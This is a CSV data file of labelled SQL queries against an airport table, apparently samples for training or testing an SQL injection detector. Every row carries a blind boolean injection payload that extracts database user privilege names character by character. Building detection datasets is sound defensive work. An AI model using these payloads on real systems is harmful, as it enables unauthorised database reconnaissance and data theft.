full_query,label,template_id,malicious_input,malicious_input_desc
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),3,1))>112-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),2,1))>112-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),4,1))>120-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),1,1))>48-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),3,1))>120-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),3,1))>124-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),2,1))>104-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),4,1))>116-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),2,1))>108-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),1,1))>40-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),3,1))>122-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),2,1))>110-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),1,1))>36-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),4,1))>114-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),1,1))>38-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),4,1))>115-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),2,1))>109-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),3,1))>121-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),1,1))>39-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),6,1))>96-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),5,1))>96-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),5,1))>112-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),7,1))>96-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),8,1))>96-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),6,1))>112-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),5,1))>120-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),8,1))>112-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),8,1))>120-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),7,1))>48-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),6,1))>104-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),6,1))>108-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),5,1))>116-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),8,1))>116-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),7,1))>24-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),6,1))>106-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),7,1))>36-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),6,1))>107-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),9,1))>96-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),8,1))>114-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),5,1))>114-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),7,1))>42-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),9,1))>112-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),8,1))>115-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),7,1))>45-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),5,1))>113-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),7,1))>46-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),9,1))>104-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),10,1))>96-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),11,1))>96-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),10,1))>112-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),9,1))>100-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),11,1))>112-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),9,1))>102-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),12,1))>96-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),10,1))>120-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),11,1))>120-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),12,1))>112-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),9,1))>101-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),11,1))>116-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),10,1))>116-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),12,1))>104-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),12,1))>108-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),11,1))>114-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),13,1))>96-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),11,1))>115-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),10,1))>114-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),13,1))>112-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),10,1))>115-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),12,1))>106-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),13,1))>104-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),14,1))>96-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),15,1))>96-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),13,1))>108-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),12,1))>105-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),14,1))>112-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),13,1))>110-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),13,1))>111-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),15,1))>48-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),14,1))>104-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),16,1))>96-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),14,1))>108-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),15,1))>24-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),15,1))>36-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),14,1))>110-- kEUL';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT' OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 1,1) AS wmak),17,1))>96-- kEUL';",1,airport-S1,Unknown,Unknown
